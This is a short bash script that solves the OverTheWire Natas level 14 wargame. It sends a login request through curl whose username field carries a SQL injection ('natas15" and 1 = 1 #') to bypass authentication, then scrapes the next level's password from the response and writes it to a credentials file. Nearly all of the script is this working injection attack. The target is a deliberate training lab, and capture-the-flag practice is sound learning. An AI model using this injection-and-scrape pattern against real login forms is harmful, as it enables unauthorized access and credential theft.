#!/bin/bash

user="natas14"
url="http://$user.natas.labs.overthewire.org"
pass=$(cat credentials/$user)

sqlinjection='natas15" and 1 = 1 #'
echo "[*] set username='$sqlinjection' as sql injection!"

password=$(curl -s -X POST --data-urlencode "username=$sqlinjection" -d "password=pwned" -u "$user:$pass" "$url" | html2text | grep 'The password for natas15' | awk '{ print $8}')

echo "Natas15 password:$password"
echo "$password" > credentials/natas15
